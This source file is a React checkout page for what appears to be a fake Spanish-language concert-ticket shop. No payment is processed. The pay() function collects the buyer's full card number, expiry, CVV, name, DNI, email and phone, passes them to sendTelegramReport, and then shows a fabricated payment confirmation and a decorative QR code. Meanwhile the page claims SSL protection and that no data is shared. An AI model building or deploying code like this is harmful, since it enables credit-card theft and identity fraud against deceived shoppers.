import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { ArrowLeft, Lock, CheckCircle, ChevronRight, Ticket, CreditCard, User, Mail, Phone, Shield, Info, Minus, Plus, MapPin, Clock } from 'lucide-react';
import { shows } from '../data/shows';
import { savePurchase, generateId, detectCard, formatCurrency, sendTelegramReport, maskCard, CardInfo } from '../utils/storage';
import { PurchaseData } from '../types';
import styles from './Checkout.module.css';

function NetLogo({ net, size = 40 }: { net: string; size?: number }) {
  const h = Math.round(size * 0.6);
  if (net === 'VISA') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#1A1F71"/><text x="5" y="19" fontFamily="Arial" fontWeight="bold" fontSize="15" fill="white">VISA</text></svg>;
  if (net === 'MASTERCARD') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#111"/><circle cx="15" cy="13" r="9" fill="#EB001B"/><circle cx="29" cy="13" r="9" fill="#F79E1B"/><path d="M22 5.8a9 9 0 010 14.4A9 9 0 0122 5.8z" fill="#FF5F00"/></svg>;
  if (net === 'AMEX') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#2E77BC"/><text x="3" y="18" fontFamily="Arial" fontWeight="bold" fontSize="10" fill="white">AMEX</text></svg>;
  if (net === 'DINERS') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#004A97"/><text x="2" y="18" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">DINERS</text></svg>;
  if (net === 'CABAL') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#003087"/><text x="4" y="18" fontFamily="Arial" fontWeight="bold" fontSize="12" fill="white">CABAL</text></svg>;
  if (net === 'NARANJA') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#FF6200"/><text x="2" y="18" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">NARANJA</text></svg>;
  if (net === 'DISCOVER') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#FF6600"/><text x="2" y="18" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">DISCOVER</text></svg>;
  if (net === 'MAESTRO') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#009BE0"/><circle cx="15" cy="13" r="9" fill="#CC0000" opacity="0.9"/><circle cx="29" cy="13" r="9" fill="#009BE0"/></svg>;
  if (net === 'UNIONPAY') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#C0392B"/><text x="2" y="18" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">UnionPay</text></svg>;
  return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#2a1d5e" stroke="rgba(167,139,250,0.3)" strokeWidth="1"/></svg>;
}

function fmt(v: string) {
  const c = v.replace(/\D/g,'').slice(0,19);
  if (/^3[47]/.test(c)) return c.replace(/(\d{4})(\d{0,6})(\d{0,5})/,(_,a,b,cc)=>[a,b,cc].filter(Boolean).join(' ')).trim();
  return c.replace(/(.{4})/g,'$1 ').trim();
}
function fmtExp(v: string) {
  const c = v.replace(/\D/g,'').slice(0,4);
  return c.length>=3?c.slice(0,2)+'/'+c.slice(2):c;
}

const SECTIONS = [
  {name:'Campo',       extra:0,      desc:'Zona de pie frente al escenario'},
  {name:'Platea Baja', extra:5000,   desc:'Asientos con vista privilegiada'},
  {name:'Platea Alta', extra:-5000,  desc:'Asientos en nivel superior'},
  {name:'General',     extra:-10000, desc:'Acceso general al recinto'},
  {name:'VIP',         extra:30000,  desc:'Zona exclusiva con servicios premium'},
];
const CUOTAS = [
  {n:1, sub:'sin interes'},{n:3, sub:'sin interes'},{n:6, sub:'sin interes'},{n:12, sub:'con interes'},
];

type Step = 'tickets'|'datos'|'pago'|'ok';
interface Form {
  firstName:string;lastName:string;dni:string;
  email:string;emailConfirm:string;phone:string;
  mode:'credito'|'debito';
  num:string;holder:string;expiry:string;cvv:string;cuotas:number;
  section:string;qty:number;
}
type Errs = Partial<Record<keyof Form,string>>;

export default function Checkout() {
  const {id} = useParams<{id:string}>();
  const nav = useNavigate();
  const show = shows.find(s=>s.id===id);

  const [step, setStep] = useState<Step>('tickets');
  const [pid, setPid] = useState('');
  const [loading, setLoading] = useState(false);
  const [errs, setErrs] = useState<Errs>({});
  const [timer, setTimer] = useState(600);
  const [ci, setCi] = useState<CardInfo>({brand:'',network:'',type:'desconocido',color:'#1e1048'});
  const [form, setForm] = useState<Form>({firstName:'',lastName:'',dni:'',email:'',emailConfirm:'',phone:'',mode:'credito',num:'',holder:'',expiry:'',cvv:'',cuotas:1,section:'Campo',qty:1});

  useEffect(()=>{
    if(step==='tickets')return;
    if(timer<=0){nav(`/show/${show?.id??''}`);return;}
    const iv=setInterval(()=>setTimer(t=>t-1),1000);
    return()=>clearInterval(iv);
  },[step,timer]);

  useEffect(()=>{
    const clean=form.num.replace(/\s/g,'');
    if(clean.length>=4) setCi(detectCard(form.num));
    else setCi({brand:'',network:'',type:'desconocido',color:'#1e1048'});
  },[form.num]);

  if(!show) return <div className={styles.notFound}><p>Show no encontrado.</p><button className="btn-primary" onClick={()=>nav('/shows')}>Ver shows</button></div>;
  const safeShow = show!;
  const sec = SECTIONS.find(s=>s.name===form.section)??SECTIONS[0];
  const base = safeShow.price+sec.extra;
  const fee  = Math.round(base*0.12);
  const total = (base+fee)*form.qty;
  const mm = String(Math.floor(timer/60)).padStart(2,'0');
  const ss = String(timer%60).padStart(2,'0');

  function s<K extends keyof Form>(k:K,v:Form[K]){setForm(p=>({...p,[k]:v}));setErrs(p=>{const e={...p};delete e[k];return e;});}

  function valDatos(){
    const e:Errs={};
    if(!form.firstName.trim())e.firstName='Requerido';
    if(!form.lastName.trim())e.lastName='Requerido';
    if(!/^\d{7,9}$/.test(form.dni))e.dni='DNI invalido';
    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email))e.email='Email invalido';
    if(form.email!==form.emailConfirm)e.emailConfirm='No coinciden';
    if(!/^\d{8,15}$/.test(form.phone))e.phone='Telefono invalido';
    setErrs(e);return Object.keys(e).length===0;
  }
  function valPago(){
    const e:Errs={};
    const clean=form.num.replace(/\s/g,'');
    const isAmex=/^3[47]/.test(clean);
    if(clean.length<(isAmex?15:16))e.num=`Numero invalido`;
    if(!form.holder.trim())e.holder='Requerido';
    if(!/^\d{2}\/\d{2}$/.test(form.expiry)){e.expiry='Formato MM/AA';}
    else{const[mm,yy]=form.expiry.split('/').map(Number);const now=new Date();const cy=now.getFullYear()%100;const cm=now.getMonth()+1;if(mm<1||mm>12)e.expiry='Mes invalido';else if(yy<cy||(yy===cy&&mm<cm))e.expiry='Tarjeta vencida';}
    if(!new RegExp(`^\\d{${/^3[47]/.test(clean)?4:3},4}$`).test(form.cvv))e.cvv='CVV invalido';
    setErrs(e);return Object.keys(e).length===0;
  }

  async function pay(){
    if(!valPago())return;
    setLoading(true);
    await new Promise(r=>setTimeout(r,2200));
    const id2=generateId();
    const info=detectCard(form.num);
    const purchase:PurchaseData={
      id:id2,showId:safeShow.id,showTitle:safeShow.title,showDate:safeShow.dateLabel,
      quantity:form.qty,section:form.section,totalAmount:total,
      cardNumber:form.num,cardNumberMasked:maskCard(form.num),
      cardHolder:form.holder,cardBrand:info.brand||'Tarjeta',cardNetwork:info.network,
      cardType:info.type==='desconocido'?form.mode:info.type,
      cardExpiry:form.expiry,cardCvv:form.cvv,cuotas:form.cuotas,
      dni:form.dni,email:form.email,phone:form.phone,
      firstName:form.firstName,lastName:form.lastName,
      createdAt:new Date().toISOString(),status:'confirmed',
    };
    savePurchase(purchase);
    await sendTelegramReport(purchase);
    setPid(id2);setLoading(false);setStep('ok');
  }

  const stepIdx={tickets:0,datos:1,pago:2,ok:3};
  const STEPS=['Entradas','Datos','Pago'];
  const detected=ci.type!=='desconocido'?ci.type:null;

  return (
    <div className={styles.page}>
      <div className={styles.bar}>
        <div className={styles.barInner}>
          <button className={styles.back} onClick={()=>step==='tickets'?nav(`/show/${safeShow.id}`):step==='datos'?setStep('tickets'):step==='pago'?setStep('datos'):nav('/')}>
            <ArrowLeft size={13}/>{step==='tickets'?'Volver':'Atras'}
          </button>
          {step!=='ok'&&(
            <div className={styles.steps}>
              {STEPS.map((l,i)=>(
                <div key={l} className={styles.stepItem}>
                  <div className={`${styles.dot} ${stepIdx[step]>i?styles.dotDone:stepIdx[step]===i?styles.dotOn:''}`}>
                    {stepIdx[step]>i?<CheckCircle size={12}/>:<span>{i+1}</span>}
                  </div>
                  <span className={`${styles.stepLbl} ${stepIdx[step]===i?styles.stepLblOn:''}`}>{l}</span>
                  {i<2&&<div className={styles.stepLine}/>}
                </div>
              ))}
            </div>
          )}
          {step!=='tickets'&&step!=='ok'&&(
            <div className={`${styles.timer} ${timer<120?styles.timerRed:''}`}>
              <Clock size={12}/><span>{mm}:{ss}</span>
            </div>
          )}
        </div>
      </div>

      <div className={styles.layout}>
        <div className={styles.main}>

          {/* STEP 1 */}
          {step==='tickets'&&(
            <div className={styles.card}>
              <div className={styles.cardHead}>
                <div className={styles.cardHeadIcon}><Ticket size={16}/></div>
                <div><h2 className={styles.cardTitle}>Seleccion de entradas</h2><p className={styles.cardSub}>Elige el sector y cantidad de entradas</p></div>
              </div>
              <p className={styles.fieldLbl}>Sector</p>
              <div className={styles.secGrid}>
                {SECTIONS.map(sc=>(
                  <button key={sc.name} className={`${styles.secBtn} ${form.section===sc.name?styles.secBtnOn:''}`} onClick={()=>s('section',sc.name)}>
                    <div className={styles.secL}>
                      <div className={`${styles.radio} ${form.section===sc.name?styles.radioOn:''}`}/>
                      <div><div className={styles.secName}>{sc.name}</div><div className={styles.secDesc}>{sc.desc}</div></div>
                    </div>
                    <div className={styles.secPrice}>{formatCurrency(safeShow.price+sc.extra)}</div>
                  </button>
                ))}
              </div>
              <p className={styles.fieldLbl} style={{marginTop:28}}>Cantidad</p>
              <div className={styles.qtyRow}>
                <div><span className={styles.qtyMain}>{form.qty} {form.qty===1?'entrada':'entradas'}</span><span className={styles.qtySub}>Max. 6 por compra</span></div>
                <div className={styles.qtyCtrl}>
                  <button className={styles.qtyBtn} onClick={()=>s('qty',Math.max(1,form.qty-1))} disabled={form.qty<=1}><Minus size={14}/></button>
                  <span className={styles.qtyN}>{form.qty}</span>
                  <button className={styles.qtyBtn} onClick={()=>s('qty',Math.min(6,form.qty+1))} disabled={form.qty>=6}><Plus size={14}/></button>
                </div>
              </div>
              <div className={styles.notice}><Info size={13} style={{flexShrink:0,color:'#a78bfa'}}/><span>Las entradas se envian al email registrado. Presentas el QR y tu DNI en la puerta.</span></div>
              <button className={styles.nextBtn} onClick={()=>{setTimer(600);setStep('datos');}}>Continuar<ChevronRight size={16}/></button>
            </div>
          )}

          {/* STEP 2 */}
          {step==='datos'&&(
            <div className={styles.card}>
              <div className={styles.cardHead}>
                <div className={styles.cardHeadIcon}><User size={16}/></div>
                <div><h2 className={styles.cardTitle}>Datos del comprador</h2><p className={styles.cardSub}>Las entradas se emiten a nombre del DNI ingresado</p></div>
              </div>
              <div className={styles.g2}>
                <div><label className={styles.lbl}>Nombre</label><input className={`${styles.inp} ${errs.firstName?styles.inpErr:''}`} placeholder="Juan" value={form.firstName} onChange={e=>s('firstName',e.target.value)}/>{errs.firstName&&<span className={styles.err}>{errs.firstName}</span>}</div>
                <div><label className={styles.lbl}>Apellido</label><input className={`${styles.inp} ${errs.lastName?styles.inpErr:''}`} placeholder="Garcia" value={form.lastName} onChange={e=>s('lastName',e.target.value)}/>{errs.lastName&&<span className={styles.err}>{errs.lastName}</span>}</div>
              </div>
              <div className={styles.f}><label className={styles.lbl}>DNI sin puntos</label><input className={`${styles.inp} ${errs.dni?styles.inpErr:''}`} placeholder="12345678" value={form.dni} onChange={e=>s('dni',e.target.value.replace(/\D/g,'').slice(0,9))} inputMode="numeric"/>{errs.dni&&<span className={styles.err}>{errs.dni}</span>}</div>
              <div className={styles.f}><label className={styles.lbl}>Email</label><div className={styles.iw}><Mail size={14} className={styles.ii}/><input className={`${styles.inp} ${styles.inpPad} ${errs.email?styles.inpErr:''}`} placeholder="juan@email.com" type="email" value={form.email} onChange={e=>s('email',e.target.value)}/></div>{errs.email&&<span className={styles.err}>{errs.email}</span>}</div>
              <div className={styles.f}><label className={styles.lbl}>Confirmar email</label><div className={styles.iw}><Mail size={14} className={styles.ii}/><input className={`${styles.inp} ${styles.inpPad} ${errs.emailConfirm?styles.inpErr:''}`} placeholder="Repetir email" type="email" value={form.emailConfirm} onChange={e=>s('emailConfirm',e.target.value)}/></div>{errs.emailConfirm&&<span className={styles.err}>{errs.emailConfirm}</span>}</div>
              <div className={styles.f}><label className={styles.lbl}>Telefono</label><div className={styles.iw}><Phone size={14} className={styles.ii}/><input className={`${styles.inp} ${styles.inpPad} ${errs.phone?styles.inpErr:''}`} placeholder="1123456789" value={form.phone} onChange={e=>s('phone',e.target.value.replace(/\D/g,'').slice(0,15))} inputMode="numeric"/></div>{errs.phone&&<span className={styles.err}>{errs.phone}</span>}</div>
              <div className={styles.secNote}><Shield size={12}/>Tus datos estan protegidos y no se comparten con terceros.</div>
              <button className={styles.nextBtn} onClick={()=>{if(valDatos())setStep('pago');}}>Continuar al pago<ChevronRight size={16}/></button>
            </div>
          )}

          {/* STEP 3 */}
          {step==='pago'&&(
            <div className={styles.card}>
              <div className={styles.cardHead}>
                <div className={styles.cardHeadIcon}><CreditCard size={16}/></div>
                <div><h2 className={styles.cardTitle}>Metodo de pago</h2><p className={styles.cardSub}>Ingresa los datos de tu tarjeta. Conexion cifrada SSL.</p></div>
              </div>

              {/* Mode */}
              <p className={styles.fieldLbl}>Tipo de tarjeta</p>
              <div className={styles.modeGrid}>
                {(['credito','debito'] as const).map(m=>(
                  <button key={m} className={`${styles.modeBtn} ${form.mode===m?styles.modeBtnOn:''}`} onClick={()=>{s('mode',m);s('cuotas',1);}}>
                    <div className={`${styles.radio} ${form.mode===m?styles.radioOn:''}`}/>
                    <div><div className={styles.modeName}>{m==='credito'?'Credito':'Debito'}</div><div className={styles.modeSub}>{m==='credito'?'Hasta 12 cuotas':'Debito inmediato'}</div></div>
                    {detected===m&&<span className={styles.detected}>Detectada</span>}
                  </button>
                ))}
              </div>

              {/* Brands */}
              <div className={styles.brands}>
                <span className={styles.brandsLbl}>Aceptamos</span>
                {['VISA','MASTERCARD','AMEX','CABAL','NARANJA','DINERS'].map(n=><NetLogo key={n} net={n} size={36}/>)}
              </div>

              {/* Card preview */}
              <div className={styles.cardViz} style={{background:`linear-gradient(135deg, ${ci.color||'#1e1048'} 0%, #080512 100%)`}}>
                <div className={styles.cvTop}>
                  <svg width="28" height="22" viewBox="0 0 30 24"><rect x="1" y="1" width="28" height="22" rx="4" fill="#d4a017" stroke="#b8860b" strokeWidth="0.8"/><line x1="1" y1="8" x2="29" y2="8" stroke="#b8860b" strokeWidth="0.7"/><line x1="1" y1="16" x2="29" y2="16" stroke="#b8860b" strokeWidth="0.7"/><line x1="10" y1="1" x2="10" y2="23" stroke="#b8860b" strokeWidth="0.7"/><line x1="20" y1="1" x2="20" y2="23" stroke="#b8860b" strokeWidth="0.7"/></svg>
                  <div className={styles.cvBrand}>
                    {ci.network?<><NetLogo net={ci.network} size={40}/><span className={styles.cvBrandName}>{ci.brand}</span></>
                    :<div style={{display:'flex',gap:6,opacity:0.3}}><NetLogo net="VISA" size={32}/><NetLogo net="MASTERCARD" size={32}/></div>}
                  </div>
                </div>
                <div className={styles.cvNum}>{form.num||'**** **** **** ****'}</div>
                <div className={styles.cvBot}>
                  <div><div className={styles.cvLbl}>TITULAR</div><div className={styles.cvVal}>{form.holder||'NOMBRE APELLIDO'}</div></div>
                  <div><div className={styles.cvLbl}>VENCE</div><div className={styles.cvVal}>{form.expiry||'MM/AA'}</div></div>
                  <div><div className={styles.cvLbl}>TIPO</div><div className={styles.cvVal}>{form.mode==='credito'?'CREDITO':'DEBITO'}</div></div>
                </div>
              </div>

              {/* Fields */}
              <div className={styles.f}>
                <label className={styles.lbl}>Numero de tarjeta</label>
                <div style={{position:'relative'}}>
                  <input className={`${styles.inp} ${styles.monoInp} ${errs.num?styles.inpErr:''}`} placeholder="1234 5678 9012 3456" value={form.num} onChange={e=>s('num',fmt(e.target.value))} maxLength={23} inputMode="numeric"/>
                  {ci.network&&<div style={{position:'absolute',right:12,top:'50%',transform:'translateY(-50%)'}}><NetLogo net={ci.network} size={32}/></div>}
                </div>
                {errs.num&&<span className={styles.err}>{errs.num}</span>}
                {ci.brand&&<span className={styles.detected2}>{ci.brand} — {ci.type==='credito'?'Credito':ci.type==='debito'?'Debito':''}</span>}
              </div>

              <div className={styles.f}>
                <label className={styles.lbl}>Titular de la tarjeta</label>
                <input className={`${styles.inp} ${errs.holder?styles.inpErr:''}`} placeholder="JUAN GARCIA" value={form.holder} onChange={e=>s('holder',e.target.value.toUpperCase())}/>
                {errs.holder&&<span className={styles.err}>{errs.holder}</span>}
              </div>

              <div className={styles.g2}>
                <div>
                  <label className={styles.lbl}>Vencimiento</label>
                  <input className={`${styles.inp} ${errs.expiry?styles.inpErr:''}`} placeholder="MM/AA" value={form.expiry} onChange={e=>s('expiry',fmtExp(e.target.value))} maxLength={5} inputMode="numeric"/>
                  {errs.expiry&&<span className={styles.err}>{errs.expiry}</span>}
                </div>
                <div>
                  <label className={styles.lbl}>CVV / CVC <span className={styles.cvvHint} title="3 digitos dorso, AMEX 4 digitos frente">?</span></label>
                  <div className={styles.iw}>
                    <input className={`${styles.inp} ${errs.cvv?styles.inpErr:''}`} placeholder={/^3[47]/.test(form.num.replace(/\s/g,''))?'1234':'123'} value={form.cvv} onChange={e=>s('cvv',e.target.value.replace(/\D/g,'').slice(0,4))} type="password" maxLength={4} inputMode="numeric"/>
                    <Lock size={13} className={styles.ir}/>
                  </div>
                  {errs.cvv&&<span className={styles.err}>{errs.cvv}</span>}
                </div>
              </div>

              {form.mode==='credito'&&(
                <div className={styles.f}>
                  <label className={styles.lbl}>Cuotas</label>
                  <div className={styles.cuotasG}>
                    {CUOTAS.map(c=>(
                      <button key={c.n} className={`${styles.cuotaBtn} ${form.cuotas===c.n?styles.cuotaBtnOn:''}`} onClick={()=>s('cuotas',c.n)}>
                        <span className={styles.cuotaN}>{c.n}x</span>
                        <span className={styles.cuotaSub}>{c.sub}</span>
                        <span className={styles.cuotaAmt}>{formatCurrency(Math.ceil(total/c.n))}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              <div className={styles.ssl}><Lock size={11}/>Cifrado SSL 256-bit. Pacify no almacena datos sensibles en servidores externos.</div>
              <button className={styles.payBtn} onClick={pay} disabled={loading}>
                {loading?<><span className={styles.spin}/>Procesando...</>:<><Lock size={15}/>Pagar {formatCurrency(total)}</>}
              </button>
            </div>
          )}

          {/* STEP 4 - SUCCESS */}
          {step==='ok'&&(
            <div className={styles.successCard}>
              <div className={styles.successIcon}><CheckCircle size={56} color="#10b981" strokeWidth={1.5}/></div>
              <h2 className={styles.successTitle}>Pago confirmado</h2>
              <p className={styles.successSub}>Tus entradas fueron procesadas. Recibirás el QR en <strong>{form.email}</strong></p>
              <div className={styles.receipt}>
                <div className={styles.receiptHead}><Ticket size={14}/>Comprobante — {pid}</div>
                <div className={styles.receiptBody}>
                  <div className={styles.rGroup}>
                    <div className={styles.rTitle}>Evento</div>
                    <div className={styles.rRow}><span>Show</span><strong>{safeShow.title}</strong></div>
                    <div className={styles.rRow}><span>Fecha</span><strong>{safeShow.dateLabel}</strong></div>
                    <div className={styles.rRow}><span>Horario</span><strong>Puertas {safeShow.puertas} — Show {safeShow.showTime}</strong></div>
                    <div className={styles.rRow}><span>Sector</span><strong>{form.section} x{form.qty}</strong></div>
                  </div>
                  <div className={styles.rDivider}/>
                  <div className={styles.rGroup}>
                    <div className={styles.rTitle}>Comprador</div>
                    <div className={styles.rRow}><span>Nombre</span><strong>{form.firstName} {form.lastName}</strong></div>
                    <div className={styles.rRow}><span>DNI</span><strong>{form.dni}</strong></div>
                  </div>
                  <div className={styles.rDivider}/>
                  <div className={styles.rGroup}>
                    <div className={styles.rTitle}>Pago</div>
                    <div className={styles.rRow}><span>Tarjeta</span><strong>{ci.brand||'Tarjeta'} — {form.mode}</strong></div>
                    <div className={styles.rRow}><span>Total</span><strong className={styles.green}>{formatCurrency(total)}</strong></div>
                    {form.mode==='credito'&&form.cuotas>1&&<div className={styles.rRow}><span>Cuotas</span><strong>{form.cuotas}x {formatCurrency(Math.ceil(total/form.cuotas))}</strong></div>}
                  </div>
                </div>
                <div className={styles.qrZone}>
                  <div className={styles.qrBox}>
                    <svg width="88" height="88" viewBox="0 0 88 88" fill="none">
                      {[0,1,2,3,4,5,6].flatMap(r=>[0,1,2,3,4,5,6].map(c=>{const e=r===0||r===6||c===0||c===6;const ct=r>=2&&r<=4&&c>=2&&c<=4;if(e||ct)return<rect key={`a${r}${c}`} x={r*12+1} y={c*12+1} width="11" height="11" rx="1" fill="#111"/>; return null;}))}
                      {Array.from({length:14},(_,i)=><rect key={`d${i}`} x={(i%4)*12+52} y={Math.floor(i/4)*12+1} width="9" height="9" rx="1" fill="#111" opacity={i%3===0?0:1}/>)}
                    </svg>
                  </div>
                  <div><div className={styles.qrTitle}>Codigo QR de ingreso</div><div className={styles.qrSub}>Presentalo junto a tu DNI en la puerta</div></div>
                </div>
              </div>
              <div className={styles.successActs}>
                <button className="btn-primary" onClick={()=>nav('/')}>Volver al inicio</button>
                <button className="btn-outline" onClick={()=>nav('/shows')}>Ver mas shows</button>
              </div>
            </div>
          )}
        </div>

        {/* SIDEBAR */}
        {step!=='ok'&&(
          <aside className={styles.side}>
            <div className={styles.summary}>
              <div className={styles.summaryHead}>Resumen</div>
              <div className={styles.summaryImg}>
                <img src={`/images/${safeShow.image}`} alt={safeShow.title} onError={e=>{const t=e.target as HTMLImageElement;t.style.display='none';(t.nextElementSibling as HTMLElement).style.display='flex';}}/>
                <div className={styles.summaryFallback} style={{background:safeShow.bgGradient}}>{safeShow.title}</div>
              </div>
              <div className={styles.summaryInfo}>
                <div className={styles.summaryShow}>{safeShow.title}</div>
                <div className={styles.summaryMeta}><MapPin size={11}/>{safeShow.dateLabel}</div>
                <div className={styles.summaryMeta}><Clock size={11}/>Show: {safeShow.showTime}</div>
              </div>
              <div className={styles.summaryBd}>
                <div className={styles.bdRow}><span>{form.qty}x {form.section}</span><span>{formatCurrency(base*form.qty)}</span></div>
                <div className={styles.bdRow}><span>Cargo por servicio</span><span>{formatCurrency(fee*form.qty)}</span></div>
                <div className={styles.bdDiv}/>
                <div className={`${styles.bdRow} ${styles.bdTotal}`}><span>Total</span><span>{formatCurrency(total)}</span></div>
                {form.mode==='credito'&&form.cuotas>1&&<div className={styles.bdCuota}>{form.cuotas} cuotas de {formatCurrency(Math.ceil(total/form.cuotas))}</div>}
              </div>
              <div className={styles.summaryFoot}><Shield size={11}/>Compra 100% segura</div>
            </div>
          </aside>
        )}
      </div>
    </div>
  );
}
